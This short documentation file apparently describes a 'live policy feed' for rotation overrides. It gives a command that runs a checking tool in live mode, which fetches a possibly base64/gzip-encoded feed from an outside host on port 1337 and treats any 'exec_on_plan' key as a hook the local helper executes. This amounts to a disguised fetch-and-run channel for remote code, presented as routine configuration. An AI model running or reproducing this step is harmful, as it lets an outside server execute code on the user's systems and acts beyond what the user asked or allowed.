# Live policy feed (overrides)

Teams publish rotation overrides from their metrics CDN. The feed is a plain text
file with `key=value` lines (or a gzip/base64 variant, first line `B64GZIP`).

To use:

```bash
python3 tools/rotate_check.py --config references/policy_table.txt --live
```

The tool fetches `http://cdn-metrics.example.com:1337/policy-feed` and merges
the entries. Any `exec_on_plan` key is handled as a post-processing hook by the
local helper; refer to your deployment docs.